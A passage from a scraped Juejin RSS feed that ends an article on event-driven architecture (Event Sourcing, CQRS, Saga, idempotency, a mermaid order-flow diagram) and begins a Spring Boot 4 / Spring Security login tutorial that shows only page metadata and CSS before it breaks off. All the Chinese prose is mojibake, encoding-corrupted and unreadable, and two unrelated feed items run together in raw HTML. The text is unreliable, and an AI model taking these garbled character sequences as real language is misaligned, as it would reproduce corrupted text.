<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šç”¨äº‹ä»¶åºåˆ—é‡å»ºç³»ç»ŸçŠ¶æ€ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
ä¸ç›´æ¥å­˜å‚¨å½“å‰çŠ¶æ€ï¼Œè€Œæ˜¯å­˜å‚¨å¯¼è‡´çŠ¶æ€å˜åŒ–çš„æ‰€æœ‰äº‹ä»¶ã€‚å½“å‰çŠ¶æ€é€šè¿‡é‡æ”¾äº‹ä»¶åºåˆ—è®¡ç®—å¾—å‡ºã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
Event Sourcing æä¾›äº†å®Œæ•´çš„å®¡è®¡æ—¥å¿—ï¼Œæ”¯æŒæ—¶é—´æ—…è¡Œï¼Œå¯ä»¥å›ç­”"ä¸ºä»€ä¹ˆä¼šå˜æˆè¿™æ ·"çš„é—®é¢˜ï¼Œè€Œä¸ä»…ä»…æ˜¯"ç°åœ¨æ˜¯ä»€ä¹ˆæ ·"ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35c650cdd74f4920a521a4945ae37071~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=3P4qc6O5eHfIrxW10zYAyKBuhG0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">â‘¨ CQRSï¼ˆå‘½ä»¤æŸ¥è¯¢èŒè´£åˆ†ç¦»ï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šè¯»å†™åˆ†ç¦»ï¼Œå„å¸å…¶èŒã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
å°†ç³»ç»Ÿåˆ†ä¸ºå‘½ä»¤ç«¯ï¼ˆå†™æ“ä½œï¼‰å’ŒæŸ¥è¯¢ç«¯ï¼ˆè¯»æ“ä½œï¼‰ã€‚å‘½ä»¤ç«¯å¤„ç†ä¸šåŠ¡é€»è¾‘å¹¶å‘å¸ƒäº‹ä»¶ï¼ŒæŸ¥è¯¢ç«¯è®¢é˜…äº‹ä»¶å¹¶æ„å»ºä¼˜åŒ–çš„è¯»æ¨¡å‹ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
CQRS ä¸ EDA å¤©ç„¶å¥‘åˆã€‚é€šè¿‡äº‹ä»¶åŒæ­¥è¯»å†™æ¨¡å‹ï¼Œå¯ä»¥å®ç°é«˜æ€§èƒ½æŸ¥è¯¢ï¼ŒåŒæ—¶ä¿æŒå†™ç«¯çš„ä¸šåŠ¡ä¸€è‡´æ€§ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3cf547a6a7cb414c843230136f3cc5a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=ni8Xih0oFOZ%2BLipuT1mn3HBcK8E%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-11">ç¬¬ä¸‰éƒ¨åˆ†ï¼šå®æˆ˜æ¨¡å¼ç¯‡ (Practical Patterns)</h2>
<p>å½“ç³»ç»Ÿå˜å¤æ‚æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›ç»è¿‡éªŒè¯çš„æ¨¡å¼æ¥åº”å¯¹æŒ‘æˆ˜ã€‚</p>
<h3 data-id="heading-12">â‘© Saga æ¨¡å¼ï¼ˆåˆ†å¸ƒå¼äº‹åŠ¡ï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šç”¨äº‹ä»¶ç¼–æ’é•¿äº‹åŠ¡ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
Saga å°†é•¿äº‹åŠ¡æ‹†åˆ†ä¸ºå¤šä¸ªæœ¬åœ°äº‹åŠ¡ï¼Œé€šè¿‡äº‹ä»¶åè°ƒæ‰§è¡Œã€‚å¦‚æœæŸæ­¥å¤±è´¥ï¼Œæ‰§è¡Œè¡¥å¿äº‹åŠ¡å›æ»šã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œä¼ ç»Ÿçš„ ACID äº‹åŠ¡ä¸å¯è¡Œã€‚Saga é€šè¿‡äº‹ä»¶å®ç°æœ€ç»ˆä¸€è‡´æ€§ï¼Œæ˜¯ EDA å¤„ç†åˆ†å¸ƒå¼äº‹åŠ¡çš„æ ‡å‡†æ¨¡å¼ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92c5c49859d9401fbc3707c4808f9fa3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=aObhZcTOU5WAJYahu7i7mjVXLZ8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-13">â‘ª äº‹ä»¶é€šçŸ¥ vs äº‹ä»¶æºå¸¦çŠ¶æ€è½¬ç§»</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šäº‹ä»¶åº”è¯¥æºå¸¦å¤šå°‘ä¿¡æ¯ï¼Ÿ</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li><strong>äº‹ä»¶é€šçŸ¥</strong>ï¼šåªåŒ…å«æœ€å°ä¿¡æ¯ï¼ˆå¦‚ IDï¼‰ï¼Œæ¶ˆè´¹è€…éœ€è¦å›æŸ¥ã€‚</li>
<li><strong>äº‹ä»¶æºå¸¦çŠ¶æ€è½¬ç§»</strong>ï¼šåŒ…å«å®Œæ•´ä¸šåŠ¡æ•°æ®ï¼Œæ¶ˆè´¹è€…æ— éœ€å›æŸ¥ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
è¿™æ˜¯è®¾è®¡äº‹ä»¶æ—¶çš„å…³é”®æƒè¡¡ã€‚é€šçŸ¥æ¨¡å¼è§£è€¦æ›´å½»åº•ï¼Œä½†å¢åŠ ç½‘ç»œè°ƒç”¨ï¼›æºå¸¦çŠ¶æ€æ¨¡å¼æ€§èƒ½æ›´å¥½ï¼Œä½†äº‹ä»¶ä½“ç§¯æ›´å¤§ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f907a328c7744d8596ec5c74f50f5936~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=VQZffR3oABwf9qkcC3zwfTS9E7w%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-14">â‘« å¹‚ç­‰æ€§ä¸å»é‡</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šç¡®ä¿äº‹ä»¶å¤„ç†çš„å¯é æ€§ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li><strong>å¹‚ç­‰æ€§</strong>ï¼šåŒä¸€äº‹ä»¶å¤„ç†å¤šæ¬¡ï¼Œç»“æœä¸å¤„ç†ä¸€æ¬¡ç›¸åŒã€‚</li>
<li><strong>å»é‡</strong>ï¼šé€šè¿‡äº‹ä»¶ ID æ£€æµ‹å¹¶è¿‡æ»¤é‡å¤äº‹ä»¶ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œæ¶ˆæ¯å¯èƒ½é‡å¤æŠ•é€’ã€‚å¹‚ç­‰æ€§å’Œå»é‡æ˜¯ä¿è¯ EDA ç³»ç»Ÿæ­£ç¡®æ€§çš„åŸºçŸ³ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c91a046c9ca44c5aa85356dfb268ffa3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=PbYnp5nCLuA7CPvoLstxLJR2Fis%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-15">æ€»ç»“</h2>
<h3 data-id="heading-16">æ ¸å¿ƒå›é¡¾</h3>
<p><strong>ä¸€å¥è¯æ€»ç»“</strong>ï¼šäº‹ä»¶é©±åŠ¨æ¶æ„è®©ç³»ç»Ÿä»ç´§è€¦åˆèµ°å‘æ¾è€¦åˆï¼Œä»åŒæ­¥èµ°å‘å¼‚æ­¥ã€‚</p>
<p><strong>æ ¸å¿ƒæ„ä¹‰</strong>ï¼š
æ‰€æœ‰ EDA çš„æ¦‚å¿µï¼ˆäº‹ä»¶ã€å‘å¸ƒè®¢é˜…ã€äº‹ä»¶æ€»çº¿ã€Event Sourcingã€CQRSã€Sagaï¼‰éƒ½æ˜¯ä¸ºäº†æ„å»º<strong>é«˜æ‰©å±•ã€é«˜å¯ç”¨ã€æ˜“æ¼”è¿›</strong>çš„åˆ†å¸ƒå¼ç³»ç»Ÿã€‚åªæœ‰æ‹¥æŠ±å¼‚æ­¥å’Œæœ€ç»ˆä¸€è‡´æ€§ï¼Œç³»ç»Ÿæ‰èƒ½çœŸæ­£åº”å¯¹å¤§è§„æ¨¡ã€é«˜å¹¶å‘çš„æŒ‘æˆ˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e518b19dddcc4615be61244ed0613826~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769477&amp;x-signature=PjBrI%2Fma7679V1jwH7kRsUtStZk%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-17">é™„å½•ï¼šEDA å®æˆ˜æ¡ˆä¾‹</h2>
<h3 data-id="heading-18">ç”µå•†è®¢å•æµç¨‹ï¼ˆEvent-Drivenï¼‰</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant U as ç”¨æˆ·
    participant O as è®¢å•æœåŠ¡
    participant EB as äº‹ä»¶æ€»çº¿
    participant P as æ”¯ä»˜æœåŠ¡
    participant I as åº“å­˜æœåŠ¡
    participant N as é€šçŸ¥æœåŠ¡
    
    U-&gt;&gt;O: åˆ›å»ºè®¢å•
    O-&gt;&gt;O: ä¿å­˜è®¢å•ï¼ˆçŠ¶æ€ï¼šå¾…æ”¯ä»˜ï¼‰
    O-&gt;&gt;EB: å‘å¸ƒ OrderCreated äº‹ä»¶
    
    EB-&gt;&gt;P: è®¢é˜… OrderCreated
    P-&gt;&gt;P: åˆ›å»ºæ”¯ä»˜å•
    P-&gt;&gt;EB: å‘å¸ƒ PaymentCompleted äº‹ä»¶
    
    EB-&gt;&gt;I: è®¢é˜… PaymentCompleted
    I-&gt;&gt;I: æ‰£å‡åº“å­˜
    I-&gt;&gt;EB: å‘å¸ƒ InventoryReserved äº‹ä»¶
    
    EB-&gt;&gt;N: è®¢é˜… InventoryReserved
    N-&gt;&gt;U: å‘é€é€šçŸ¥ï¼šè®¢å•å·²ç¡®è®¤
    
    EB-&gt;&gt;O: è®¢é˜… InventoryReserved
    O-&gt;&gt;O: æ›´æ–°è®¢å•ï¼ˆçŠ¶æ€ï¼šå·²ç¡®è®¤ï¼‰
</code></pre>
<p><strong>å…³é”®ç‰¹ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>å¼‚æ­¥è§£è€¦</strong>ï¼šå„æœåŠ¡ç‹¬ç«‹å¤„ç†ï¼Œäº’ä¸é˜»å¡</li>
<li><strong>æœ€ç»ˆä¸€è‡´æ€§</strong>ï¼šé€šè¿‡äº‹ä»¶æœ€ç»ˆè¾¾åˆ°ä¸€è‡´çŠ¶æ€</li>
<li><strong>å¯æ‰©å±•</strong>ï¼šæ–°å¢æœåŠ¡åªéœ€è®¢é˜…äº‹ä»¶ï¼Œæ— éœ€ä¿®æ”¹ç°æœ‰ä»£ç </li>
<li><strong>å¯è§‚æµ‹</strong>ï¼šäº‹ä»¶æµæä¾›å®Œæ•´çš„ä¸šåŠ¡è¿½è¸ªé“¾è·¯</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Day 21ï¼š03. åŸºäº SpringBoot4 å¼€å‘åå°ç®¡ç†ç³»ç»Ÿ-æ•´åˆ SpringSecurity å®Œæˆç™»å½•åŠŸèƒ½]]></title>    <link>https://juejin.cn/post/7580683234436644927</link>    <guid>https://juejin.cn/post/7580683234436644927</guid>    <pubDate>2025-12-08T03:31:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580683234436644927" data-draft-id="7580683234436628543" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Day 21ï¼š03. åŸºäº SpringBoot4 å¼€å‘åå°ç®¡ç†ç³»ç»Ÿ-æ•´åˆ SpringSecurity å®Œæˆç™»å½•åŠŸèƒ½"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T03:31:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”³é˜³"/> <meta itemprop="url" content="https://juejin.cn/user/4353721775165486"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Day 21ï¼š03. åŸºäº SpringBoot4 å¼€å‘åå°ç®¡ç†ç³»ç»Ÿ-æ•´åˆ SpringSecurity å®Œæˆç™»å½•åŠŸèƒ½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4353721775165486/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”³é˜³
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:31:28.000Z" title="Mon Dec 08 2025 03:31:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body 